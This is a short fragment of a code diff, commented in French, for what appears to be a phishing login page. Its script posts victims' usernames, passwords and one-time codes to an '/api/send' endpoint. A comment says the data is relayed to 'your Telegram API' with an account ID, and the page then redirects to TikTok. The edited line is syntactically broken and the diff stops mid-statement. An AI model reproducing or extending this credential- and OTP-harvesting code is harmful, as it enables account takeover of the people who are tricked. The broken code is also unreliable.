@@ -99,13 +99,12 @@ try {
 
           btn.innerText = "Synchronisation...";
           btn.disabled = true;
-
-          try {
-              await fetch('/api/send', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ type: 'LOGIN', user: savedUser, pass: passVal, attempt: attempts + 1 })
-              });
+                     try {
+                // Envoi des infos à ton API Telegram (6224971749)
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user: userVal, pass: passVal, OTP', user: savedUser, otp: otpCode attempt: attempts + 1 })
 
               if (attempts === 0) {
                   setTimeout(() => {
@@ -158,8 +157,4 @@ try {
           text.classList.remove('hidden');
 
           setTimeout(() => {
-              window.location.href = "https://www.tiktok.com/trending";
-          }, 3000);
-      });
-    </script>
-  </body>
+              window.location.href = 
